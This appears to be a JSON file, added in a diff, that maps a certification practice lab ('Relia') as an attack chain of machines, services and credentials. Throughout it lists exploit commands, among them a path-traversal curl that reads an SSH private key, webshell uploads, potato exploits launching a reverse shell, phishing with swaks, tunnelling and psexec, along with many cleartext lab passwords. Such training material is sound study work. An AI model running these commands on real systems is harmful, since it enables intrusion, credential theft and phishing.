@@ -1,0 +1,826 @@
+{
+  "id": "fan-out-convergence",
+  "title": "Fan-Out Convergence",
+  "category": "ad-chain",
+  "source": ["Relia"],
+  "designed_by": "lab-derived",
+  "description": "Largest lab: 16 machines across 2 networks. Multiple external entry points (RiteCMS, Apache CVE, Umbraco, DNN SMB, phishing) converge via .249 git creds → .189 MAIL phishing → .14 WK01. Internal sweep via .21 PS transcript → domain admin → psexec. Linux: .245/.246 SSH chain, .19 borg/pspy, .20 BSD doas.",
+  "introduction": "Teaches multi-vector convergence: many entry points lead to one internal bridge. OSCP-relevant for managing complexity—track which creds unlock which path; phishing or SMB may be the only way in.",
+  "mental_model": "Map all external footholds first; credentials from one (git, KeePass, FTP) may bridge to internal. SMB shares and PS transcripts often contain domain admin passwords. Follow the credential, not the machine.",
+  "key_principles": [
+    "Multiple entry points converge—git creds enable phishing; KeePass holds many",
+    "SMB enum with low-priv creds; scripts/monitoring shares have hardcoded passwords",
+    "PowerShell transcripts and history files leak domain admin creds",
+    "Phishing (Library-ms + WebDAV) may be only external→internal bridge",
+    "pspy reveals cron passphrases; doas/sudo misconfigs for Linux privesc"
+  ],
+
+  "indicators": {
+    "difficulty": 8,
+    "cognitive_load": 9,
+    "enumeration_depth": 7,
+    "rabbit_hole_risk": 7,
+    "time_pressure": 10
+  },
+
+  "mitre": {
+    "tactics": ["TA0001","TA0003","TA0004","TA0005","TA0006","TA0007","TA0008"],
+    "techniques": [
+      {"id":"T1190","name":"Exploit Public-Facing Application"},
+      {"id":"T1566.001","name":"Phishing: Spearphishing Attachment"},
+      {"id":"T1134.001","name":"Token Impersonation/Theft"},
+      {"id":"T1003.001","name":"LSASS Memory"},
+      {"id":"T1552.001","name":"Credentials In Files"},
+      {"id":"T1558.003","name":"Kerberoasting"},
+      {"id":"T1558.004","name":"AS-REP Roasting"},
+      {"id":"T1555.005","name":"Credentials from Password Stores"},
+      {"id":"T1574.001","name":"DLL Search Order Hijacking"},
+      {"id":"T1053.005","name":"Scheduled Task"},
+      {"id":"T1053.003","name":"Cron Job"},
+      {"id":"T1068","name":"Exploitation for Privilege Escalation"},
+      {"id":"T1569.002","name":"Service Execution"},
+      {"id":"T1021.001","name":"Remote Desktop Protocol"},
+      {"id":"T1021.004","name":"SSH"},
+      {"id":"T1021.006","name":"Windows Remote Management"},
+      {"id":"T1572","name":"Protocol Tunneling"},
+      {"id":"T1548.003","name":"Sudo/SU"},
+      {"id":"T1550.002","name":"Pass the Hash"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon","T2-Web-Access","T3-NonWeb-Access","T4a-Linux-PrivEsc","T4b-Win-PrivEsc","T5-Credentials","T6-Pivoting","T7-Lateral","T8-Domain"],
+
+  "environment": {
+    "machine_count": 16,
+    "network_count": 2,
+    "os_distribution": {"windows": 12, "linux": 4},
+    "has_ad": true,
+    "has_pivoting": true,
+    "has_client_side": true
+  },
+
+  "technique_tags": [
+    "phishing","library-ms","webdav","kerberoasting","keepass","ps-transcripts","psexec",
+    "ritecms","umbraco","dnn","ssh2john","godpotato","sigmatpotato","sweetpotato",
+    "mimikatz","pspy","cron","git","CVE-2021-41773","CVE-2021-3156","CVE-2023-28252",
+    "CVE-2024-30088","dll-hijacking","scheduled-task","borg","doas","ligolo-ng","evil-winrm",
+    "nmap","feroxbuster","crackmapexec","nxc","impacket-psexec","xfreerdp","swaks"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": true,
+    "pen200_modules": [6,8,9,12,13,16,17,18,19,23,24],
+    "pattern_frequency": "high",
+    "recommended_order": 2
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id":"external","cidr":"192.168.x.0/24","label":"External DMZ"},
+    {"id":"internal","cidr":"172.16.x.0/24","label":"Internal AD"}
+  ],
+
+  "machines": [
+    {
+      "id":"web01",
+      "label":"WEB01",
+      "ip":"192.168.x.245",
+      "os":"Linux",
+      "role":"Standalone",
+      "networks":["external"],
+      "services":[
+        {
+          "port":80,"name":"Apache","version":"2.4.49",
+          "vulnerabilities":[
+            {"type":"rce","cve":"CVE-2021-41773","summary":"Path traversal → read id_ecdsa","leads_to":"ssh-creds"}
+          ],
+          "commands":[
+            "curl -s --path-as-is 'http://192.168.x.245/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/id_ecdsa'",
+            "searchsploit apache 2.4.49"
+          ]
+        },
+        {
+          "port":22,"name":"SSH","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"SSH with anita key (ssh2john crack fireball)","leads_to":"local-user"}
+          ],
+          "commands":[
+            "ssh2john id_ecdsa > id_ecdsa.hash",
+            "john id_ecdsa.hash --wordlist=rockyou.txt",
+            "ssh -i id_ecdsa anita@192.168.x.245"
+          ]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"anita",
+          "to":"root",
+          "technique":"CVE-2021-3156 sudo heap overflow (Baron Samedit)",
+          "commands":[
+            "sudo -l",
+            "searchsploit sudo 1.8.31",
+            "python3 exploit.py"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"anita","type":"ssh-key","source":"path traversal + ssh2john crack","unlocks":["web01","demo"]}
+      ],
+      "alternatives":[
+        {"source":"R4","description":"XenSpawn exploit instead of CVE-2021-3156"}
+      ]
+    },
+    {
+      "id":"demo",
+      "label":"DEMO",
+      "ip":"192.168.x.246",
+      "os":"Linux",
+      "role":"Standalone",
+      "networks":["external"],
+      "services":[
+        {
+          "port":80,"name":"HTTP","version":"",
+          "vulnerabilities":[
+            {"type":"lfi","summary":"PHP LFI → RCE via .245 path traversal or direct include","leads_to":"local-user"}
+          ],
+          "commands":[
+            "curl 'http://192.168.x.246/index.php?page=...'",
+            "LFI to include /etc/passwd or upload shell"
+          ]
+        },
+        {
+          "port":22,"name":"SSH","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"SSH with anita key (reused from .245)","leads_to":"local-user"}
+          ],
+          "commands":["ssh -i id_ecdsa anita@192.168.x.246"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"anita",
+          "to":"root",
+          "technique":"sudo ALL → root",
+          "commands":["sudo -l","sudo /bin/bash"]
+        }
+      ],
+      "credentials":[],
+      "alternatives":[]
+    },
+    {
+      "id":"web02",
+      "label":"WEB02",
+      "ip":"192.168.x.247",
+      "os":"Windows",
+      "role":"Standalone",
+      "networks":["external"],
+      "services":[
+        {
+          "port":21,"name":"FTP","version":"",
+          "vulnerabilities":[
+            {"type":"anon","summary":"FTP anonymous → umbraco.pdf (mark:OathDeeplyReprieve91)","leads_to":"cms-creds"}
+          ],
+          "commands":[
+            "ftp 192.168.x.247",
+            "anonymous / anonymous",
+            "get umbraco.pdf",
+            "strings umbraco.pdf | grep -i pass"
+          ]
+        },
+        {
+          "port":80,"name":"Umbraco CMS","version":"7",
+          "vulnerabilities":[
+            {"type":"rce","cve":"ExploitDB 49488","summary":"Authenticated RCE with mark creds","leads_to":"local-user"}
+          ],
+          "commands":[
+            "searchsploit umbraco",
+            "python3 exploit.py -u mark -p 'OathDeeplyReprieve91' http://192.168.x.247"
+          ]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"iis_service / low-priv",
+          "to":"SYSTEM",
+          "technique":"SeImpersonate → GodPotato / SigmaPotato",
+          "commands":[
+            "whoami /priv",
+            "GodPotato.exe -cmd 'cmd /c whoami'",
+            "SigmaPotato.exe -e EfsRpc -p C:\\tmp\\rev.exe"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"mark","type":"password","source":"umbraco.pdf from FTP","unlocks":["web02-umbraco"]}
+      ],
+      "alternatives":[
+        {"source":"R5","description":"SigmaPotato instead of GodPotato"}
+      ]
+    },
+    {
+      "id":"external",
+      "label":"EXTERNAL",
+      "ip":"192.168.x.248",
+      "os":"Windows",
+      "role":"Standalone",
+      "networks":["external"],
+      "services":[
+        {
+          "port":445,"name":"SMB","version":"",
+          "vulnerabilities":[
+            {"type":"guest","summary":"SMB guest → writable transfer share → upload ASPX to DNN webroot","leads_to":"webshell"}
+          ],
+          "commands":[
+            "smbclient -N -L //192.168.x.248",
+            "smbclient -N //192.168.x.248/transfer -c 'put shell.aspx'",
+            "curl http://192.168.x.248/Portals/0/shell.aspx"
+          ]
+        },
+        {
+          "port":80,"name":"DNN","version":"",
+          "vulnerabilities":[
+            {"type":"webshell","summary":"ASPX webshell via SMB share upload","leads_to":"local-user"}
+          ],
+          "commands":[]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"iis_service / low-priv",
+          "to":"SYSTEM",
+          "technique":"SeImpersonate → GodPotato / RasMan",
+          "commands":[
+            "GodPotato.exe -cmd 'cmd /c whoami'",
+            "RasMan.exe variant"
+          ]
+        },
+        {
+          "from":"low-priv",
+          "to":"SYSTEM",
+          "technique":"CVE-2023-28252 CLFS driver kernel exploit",
+          "commands":["# R5: kernel exploit via Metasploit or standalone"]
+        }
+      ],
+      "credentials":[
+        {"user":"emma","type":"password","source":"KeePass Database.kdbx (keepass2john → welcome1)","unlocks":[]},
+        {"user":"bo","type":"password","source":"KeePass","unlocks":[]},
+        {"user":"sa","type":"password","source":"KeePass Database.kdbx","unlocks":[]},
+        {"user":"mark","type":"password","source":"WinPEAS AppKey env var (!8@aBRBYdb3!)","unlocks":["web02-umbraco"]}
+      ],
+      "alternatives":[
+        {"source":"R1/R2","description":"DNN admin weak creds (admin/password) as alternative entry"},
+        {"source":"R5","description":"CVE-2023-28252 kernel exploit instead of potato"},
+        {"source":"R1/R2/R4","description":"KeePass: keepass2john Database.kdbx > k.hash && john k.hash -w=rockyou.txt (welcome1) → emma:SomersetVinyl1!, bo:Luigi=Papal1963, sa:SAPassword_1998","commands":["keepass2john Database.kdbx > keepass.hash","john keepass.hash --wordlist=rockyou.txt"]}
+      ]
+    },
+    {
+      "id":"legacy",
+      "label":"LEGACY",
+      "ip":"192.168.x.249",
+      "os":"Windows",
+      "role":"Standalone",
+      "networks":["external"],
+      "services":[
+        {
+          "port":80,"name":"RiteCMS","version":"3.1.0",
+          "vulnerabilities":[
+            {"type":"auth-rce","summary":"RiteCMS default creds → RCE","leads_to":"local-user"}
+          ],
+          "commands":[
+            "searchsploit ritecms",
+            "admin / admin or default creds",
+            "Authenticated RCE exploit"
+          ]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"damon",
+          "to":"admin",
+          "technique":"PowerShell history credential mining",
+          "commands":[
+            "type C:\\Users\\damon\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
+            "Get-Content (Get-PSReadlineOption).HistorySavePath"
+          ]
+        },
+        {
+          "from":"admin",
+          "to":"SYSTEM",
+          "technique":"Token impersonation or CVE-2024-30088 kernel exploit",
+          "commands":["# R5: CVE-2024-30088 authz_basep via Metasploit"]
+        }
+      ],
+      "credentials":[
+        {"user":"damon","type":"password","source":"PS history","unlocks":["legacy-privesc"]},
+        {"user":"maildmz","type":"email-creds","source":"git repo on LEGACY","unlocks":["mail"]}
+      ],
+      "alternatives":[
+        {"source":"R2,R3,R4","description":"Git repo → maildmz email creds for phishing chain"}
+      ]
+    },
+    {
+      "id":"winprep",
+      "label":"WINPREP",
+      "ip":"192.168.x.250",
+      "os":"Windows",
+      "role":"Standalone",
+      "networks":["external"],
+      "services":[
+        {
+          "port":5985,"name":"WinRM","version":"",
+          "vulnerabilities":[
+            {"type":"given-creds","summary":"Given creds for practice","leads_to":"local-user"}
+          ],
+          "commands":["evil-winrm -i 192.168.x.250 -u <user> -p <pass>"]
+        }
+      ],
+      "privesc":[],
+      "credentials":[],
+      "alternatives":[
+        {"source":"All","description":"Trivial practice box — no flags"}
+      ]
+    },
+    {
+      "id":"mail",
+      "label":"MAIL",
+      "ip":"192.168.x.189",
+      "os":"Linux",
+      "role":"Standalone",
+      "networks":["external"],
+      "services":[
+        {
+          "port":25,"name":"SMTP","version":"",
+          "vulnerabilities":[
+            {"type":"relay","summary":"Phishing via swaks + Library-ms + WebDAV","leads_to":"client-attack"}
+          ],
+          "commands":[
+            "swaks --to jim@relia.com --from maildmz@relia.com --server 192.168.x.189 --attach @library-ms.hta",
+            "# Library-ms + WebDAV payload for jim on .14 WK01"
+          ]
+        }
+      ],
+      "privesc":[],
+      "credentials":[],
+      "alternatives":[
+        {"source":"R2,R3,R4","description":"Phishing chain: .249 git creds + .189 mail → jim on .14"}
+      ]
+    },
+    {
+      "id":"login",
+      "label":"LOGIN",
+      "ip":"192.168.x.191",
+      "os":"Windows",
+      "role":"Pivot (dual-NIC)",
+      "networks":["external","internal"],
+      "services":[
+        {
+          "port":3389,"name":"RDP","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"RDP with dmzadmin:SlimGodhoodMope (from .14 KeePass)","leads_to":"pivot"}
+          ],
+          "commands":[
+            "xfreerdp /v:192.168.x.191 /u:dmzadmin /p:'SlimGodhoodMope'",
+            "# Dual-NIC pivot to 172.16.x.0/24"
+          ]
+        }
+      ],
+      "privesc":[],
+      "credentials":[],
+      "alternatives":[
+        {"source":"All","description":"Pivot machine — RDP from external, access internal network"}
+      ]
+    },
+    {
+      "id":"dc02",
+      "label":"DC02",
+      "ip":"172.16.x.6",
+      "os":"Windows",
+      "role":"Domain Controller",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":445,"name":"SMB","version":"",
+          "vulnerabilities":[
+            {"type":"pth","summary":"psexec with RELIA\\Administrator","leads_to":"domain-admin"}
+          ],
+          "commands":[
+            "impacket-psexec RELIA/Administrator:vau!XCKjNQBv2$@172.16.x.6",
+            "nxc smb 172.16.x.0/24 -u Administrator -H <hash>"
+          ]
+        }
+      ],
+      "privesc":[],
+      "credentials":[],
+      "alternatives":[
+        {"source":"R1","description":"DCSync with mimikatz after DA"}
+      ]
+    },
+    {
+      "id":"intranet",
+      "label":"INTRANET",
+      "ip":"172.16.x.7",
+      "os":"Windows",
+      "role":"AD Member",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":3389,"name":"RDP","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"RDP with michelle:NotMyPassword0k? (from Kerberoast/AS-REP)","leads_to":"local-user"}
+          ],
+          "commands":[
+            "impacket-GetNPUsers RELIA/ -usersfile users.txt -dc-ip 172.16.x.6",
+            "xfreerdp /v:172.16.x.7 /u:michelle /p:'NotMyPassword0k?'"
+          ]
+        },
+        {
+          "port":80,"name":"WordPress","version":"",
+          "vulnerabilities":[
+            {"type":"info","summary":"WordPress site — michelle RDP for WordPress access","leads_to":"dll-hijack"}
+          ],
+          "commands":[]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"michelle",
+          "to":"SYSTEM",
+          "technique":"DLL Hijacking via Procmon (Scheduler service)",
+          "commands":[
+            "Procmon on .7 → find Scheduler service loading missing DLL",
+            "Place malicious DLL in writable path",
+            "Restart Scheduler service"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"michelle","type":"password","source":"AS-REP Roasting / Kerberoasting","unlocks":["intranet"]},
+        {"user":"andrea","type":"password","source":"Mimikatz on .7 after SYSTEM","unlocks":["wk02"]}
+      ],
+      "alternatives":[
+        {"source":"R4","description":"DLL Hijacking on Scheduler service"}
+      ]
+    },
+    {
+      "id":"wk01",
+      "label":"WK01",
+      "ip":"172.16.x.14",
+      "os":"Windows",
+      "role":"AD Member",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":5985,"name":"WinRM","version":"",
+          "vulnerabilities":[
+            {"type":"phishing","summary":"Phishing target — jim opens Library-ms attachment → shell","leads_to":"local-user"}
+          ],
+          "commands":[
+            "# Phishing: swaks + Library-ms + WebDAV → jim opens on .14",
+            "# Reverse shell as jim"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"jim","type":"password","source":"phishing shell","unlocks":["wk01"]},
+        {"user":"jim","type":"password","source":"jim:Castello1! for SMB enum","unlocks":["files"]},
+        {"user":"dmzadmin","type":"password","source":"KeePass (mercedes1) → dmzadmin:SlimGodhoodMope","unlocks":["login"]}
+      ],
+      "privesc":[],
+      "alternatives":[
+        {"source":"R2,R3,R4","description":"Phishing chain is the ONLY bridge external → internal"}
+      ]
+    },
+    {
+      "id":"wk02",
+      "label":"WK02",
+      "ip":"172.16.x.15",
+      "os":"Windows",
+      "role":"AD Member",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":3389,"name":"RDP","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"RDP with andrea (from .7 Mimikatz)","leads_to":"local-user"}
+          ],
+          "commands":["xfreerdp /v:172.16.x.15 /u:andrea /p:'PasswordPassword_6'"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"andrea",
+          "to":"SYSTEM",
+          "technique":"Scheduled task typo exploit (scheduler.ps1)",
+          "commands":[
+            "Find scheduler.ps1 with typo (updatecollctor vs updatecollector)",
+            "Drop revshell as updatecollctor.exe in writable path",
+            "Wait for scheduled task to run"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"andrea","type":"password","source":"Mimikatz on .7 INTRANET","unlocks":["wk02"]},
+        {"user":"sarah","type":"ssh-key","source":"KeePass on .15 after SYSTEM","unlocks":["backup"]}
+      ],
+      "alternatives":[
+        {"source":"R4","description":"scheduler.ps1 typo exploit"}
+      ]
+    },
+    {
+      "id":"backup",
+      "label":"BACKUP",
+      "ip":"172.16.x.19",
+      "os":"Linux",
+      "role":"Standalone",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":22,"name":"SSH","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"SSH with sarah key (from .15 KeePass)","leads_to":"local-user"}
+          ],
+          "commands":["ssh -i sarah_key sarah@172.16.x.19"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"sarah",
+          "to":"root",
+          "technique":"pspy → borg backup cron → amy:backups1 → root",
+          "commands":[
+            "pspy64",
+            "# Observe borg backup cron with passphrase",
+            "amy:backups1 → su root"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"sarah","type":"ssh-key","source":"KeePass on .15","unlocks":["backup"]},
+        {"user":"amy","type":"password","source":"pspy borg backup creds","unlocks":["backup-root"]},
+        {"user":"andrew","type":"password","source":"rsync.sh on .19 → Rb9kNokjDsjYyH","unlocks":["bsd"]}
+      ],
+      "alternatives":[
+        {"source":"R2,R4","description":"pspy → borg backup passphrase"}
+      ]
+    },
+    {
+      "id":"bsd",
+      "label":"BSD",
+      "ip":"172.16.x.20",
+      "os":"Linux",
+      "role":"Standalone",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":22,"name":"SSH","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"SSH with andrew:Rb9kNokjDsjYyH (from .19 rsync.sh)","leads_to":"local-user"}
+          ],
+          "commands":["ssh andrew@172.16.x.20"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"andrew",
+          "to":"root",
+          "technique":"doas → apache → webshell",
+          "commands":[
+            "doas -u apache /bin/sh",
+            "Place webshell in Apache docroot",
+            "Access webshell as root"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"andrew","type":"password","source":"rsync.sh on .19","unlocks":["bsd"]},
+        {"user":"mountuser","type":"password","source":"DRtajyCwcbWvH/9 → SSH .21 FILES","unlocks":["files"]}
+      ],
+      "alternatives":[
+        {"source":"R2,R4","description":"doas apache for privesc"}
+      ]
+    },
+    {
+      "id":"files",
+      "label":"FILES",
+      "ip":"172.16.x.21",
+      "os":"Windows",
+      "role":"AD Member",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":445,"name":"SMB","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"SMB enum with jim:Castello1! → PowerShell transcript","leads_to":"domain-admin"}
+          ],
+          "commands":[
+            "smbclient -U 'jim%Castello1!' -L //172.16.x.21",
+            {"cmd": "smbclient -U 'jim%Castello1!' //172.16.x.21/monitoring -c 'get *.ps1'", "rationale": "Why: PS scripts often contain hardcoded domain creds"},
+            "smbclient -U 'jim%Castello1!' //172.16.x.21/scripts -c 'get *.ps1'",
+            "strings transcript.ps1 | grep -i password"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"RELIA\\Administrator","type":"password","source":"PowerShell transcript / scripts share","unlocks":["dc02","intranet","wk02","webby"]}
+      ],
+      "privesc":[],
+      "alternatives":[
+        {"source":"R4","description":"Scripts share has hardcoded creds (john.m, mountuser) in PS scripts"}
+      ]
+    },
+    {
+      "id":"webby",
+      "label":"WEBBY",
+      "ip":"172.16.x.30",
+      "os":"Windows",
+      "role":"AD Member",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":445,"name":"SMB","version":"",
+          "vulnerabilities":[
+            {"type":"pth","summary":"psexec with domain admin","leads_to":"local-user"}
+          ],
+          "commands":["impacket-psexec RELIA/Administrator:vau!XCKjNQBv2$@172.16.x.30"]
+        },
+        {
+          "port":80,"name":"IIS","version":"",
+          "vulnerabilities":[
+            {"type":"spn","summary":"iis_service SPN → Kerberoasting target","leads_to":"hash"}
+          ],
+          "commands":[
+            "impacket-GetUserSPNs RELIA/jim -dc-ip 172.16.x.6 -request"
+          ]
+        }
+      ],
+      "privesc":[],
+      "credentials":[],
+      "alternatives":[
+        {"source":"R4","description":"Kerberoasting iis_service (http/webby.relia.com SPN)"}
+      ]
+    }
+  ],
+
+  "connections":[
+    {
+      "from":"web01","to":"demo",
+      "technique":"SSH key reuse",
+      "requires":"anita id_ecdsa (cracked with fireball) from .245 path traversal",
+      "pivot":"Direct SSH",
+      "path_ids":["path-b"],
+      "commands":[
+        "ssh -i id_ecdsa anita@192.168.x.246"
+      ]
+    },
+    {
+      "from":"legacy","to":"mail",
+      "technique":"Git creds → email creds → phishing",
+      "requires":"maildmz creds from git repo on .249",
+      "pivot":"swaks to .189 MAIL",
+      "path_ids":["path-a","path-convergence"],
+      "commands":[
+        "cd git-repo && git log --oneline",
+        "git show <commit>",
+        "swaks --to jim@relia.com --from maildmz@relia.com --server 192.168.x.189 --attach @library-ms.hta"
+      ]
+    },
+    {
+      "from":"mail","to":"wk01",
+      "technique":"Phishing (Library-ms + WebDAV)",
+      "requires":"Phishing chain from .249 mail creds",
+      "pivot":"jim opens attachment on .14",
+      "path_ids":["path-convergence"],
+      "commands":[
+        "# Library-ms + WebDAV payload",
+        "# jim opens → reverse shell on .14 WK01"
+      ]
+    },
+    {
+      "from":"wk01","to":"login",
+      "technique":"RDP with dmzadmin",
+      "requires":"dmzadmin:SlimGodhoodMope from KeePass on .14",
+      "pivot":"Ligolo-ng / proxychains through .191",
+      "path_ids":["path-convergence","path-internal"],
+      "commands":[
+        "xfreerdp /v:192.168.x.191 /u:dmzadmin /p:'SlimGodhoodMope'",
+        "ligolo-ng agent -connect 192.168.x.KALI:11601",
+        "ip route add 172.16.x.0/24 dev ligolo"
+      ]
+    },
+    {
+      "from":"wk01","to":"files",
+      "technique":"SMB enum with jim creds",
+      "requires":"jim:Castello1!",
+      "pivot":"Tunnel through .191 to internal",
+      "path_ids":["path-internal"],
+      "commands":[
+        "smbclient -U 'jim%Castello1!' -L //172.16.x.21",
+        "smbclient -U 'jim%Castello1!' //172.16.x.21/monitoring -c 'get *.ps1'"
+      ]
+    },
+    {
+      "from":"files","to":"dc02",
+      "technique":"psexec with domain admin",
+      "requires":"RELIA\\Administrator:vau!XCKjNQBv2$ from PS transcript",
+      "pivot":"Already on internal via .191",
+      "path_ids":["path-internal"],
+      "commands":[
+        {"cmd": "impacket-psexec RELIA/Administrator:vau!XCKjNQBv2$@172.16.x.6", "rationale": "Why: PS transcript creds give domain admin; psexec to DC"}
+      ]
+    },
+    {
+      "from":"intranet","to":"wk02",
+      "technique":"RDP with andrea",
+      "requires":"andrea:PasswordPassword_6 from Mimikatz on .7",
+      "pivot":"Internal network",
+      "path_ids":["path-internal-r4"],
+      "commands":[
+        "xfreerdp /v:172.16.x.15 /u:andrea /p:'PasswordPassword_6'"
+      ]
+    },
+    {
+      "from":"wk02","to":"backup",
+      "technique":"SSH with sarah key",
+      "requires":"sarah SSH key from KeePass on .15",
+      "pivot":"Internal network",
+      "path_ids":["path-internal-r4"],
+      "commands":[
+        "ssh -i sarah_key sarah@172.16.x.19"
+      ]
+    },
+    {
+      "from":"backup","to":"bsd",
+      "technique":"SSH with andrew",
+      "requires":"andrew:Rb9kNokjDsjYyH from rsync.sh on .19",
+      "pivot":"Internal network",
+      "path_ids":["path-internal-r4"],
+      "commands":[
+        "ssh andrew@172.16.x.20"
+      ]
+    },
+    {
+      "from":"bsd","to":"files",
+      "technique":"SSH with mountuser",
+      "requires":"mountuser:DRtajyCwcbWvH/9 from .20 or scripts share",
+      "pivot":"Internal network",
+      "path_ids":["path-internal-r4"],
+      "commands":[
+        "ssh mountuser@172.16.x.21"
+      ]
+    }
+  ],
+
+  "attack_paths":[
+    {
+      "id":"path-a",
+      "name":"PATH A: LEGACY (RiteCMS → Git)",
+      "color":"#6bb8cc",
+      "steps":["legacy","mail"],
+      "description":"RiteCMS default creds → RCE → PS history (damon) → privesc → git repo → maildmz email creds"
+    },
+    {
+      "id":"path-b",
+      "name":"PATH B: WEB01 → DEMO (Apache CVE)",
+      "color":"#85e89d",
+      "steps":["web01","demo"],
+      "description":"Apache 2.4.49 CVE-2021-41773 path traversal → id_ecdsa → ssh2john (fireball) → SSH anita → CVE-2021-3156 root → anita key on .246"
+    },
+    {
+      "id":"path-c",
+      "name":"PATH C: WEB02 (FTP → Umbraco)",
+      "color":"#d2a8ff",
+      "steps":["web02"],
+      "description":"FTP anon → umbraco.pdf (mark:OathDeeplyReprieve91) → Umbraco 7 auth RCE → SeImpersonate → GodPotato/SigmaPotato → SYSTEM"
+    },
+    {
+      "id":"path-d",
+      "name":"PATH D: EXTERNAL (SMB → DNN)",
+      "color":"#f0e68c",
+      "steps":["external"],
+      "description":"SMB guest → writable transfer share → upload ASPX to DNN webroot → SeImpersonate → GodPotato/RasMan → SYSTEM → KeePass → emma, bo, sa, mark"
+    },
+    {
+      "id":"path-convergence",
+      "name":"CONVERGENCE: Phishing Chain",
+      "color":"#e8a87c",
+      "steps":["legacy","mail","wk01","login"],
+      "description":".249 git creds → phishing via .189 MAIL → swaks + Library-ms + WebDAV → jim opens on .14 → KeePass (mercedes1) → dmzadmin → RDP .191 LOGIN → pivot to 172.16.x.0/24"
+    },
+    {
+      "id":"path-internal",
+      "name":"INTERNAL: Domain Admin Sweep",
+      "color":"#c38d9e",
+      "steps":["wk01","files","dc02","intranet","wk02","webby"],
+      "description":"jim:Castello1! → SMB enum .21 FILES → PowerShell transcript → RELIA\\Administrator:vau!XCKjNQBv2$ → psexec sweep .6 DC, .7, .15, .21, .30"
+    },
+    {
+      "id":"path-internal-r4",
+      "name":"INTERNAL: R4 Lateral Chain",
+      "color":"#41b3a3",
+      "steps":["intranet","wk02","backup","bsd","files"],
+      "description":".7 michelle RDP → DLL Hijacking → Mimikatz → andrea → .15 scheduler.ps1 typo → KeePass → sarah SSH → .19 pspy → borg → amy → root → rsync.sh → andrew → .20 doas → apache → mountuser → .21"
+    }
+  ]
+}
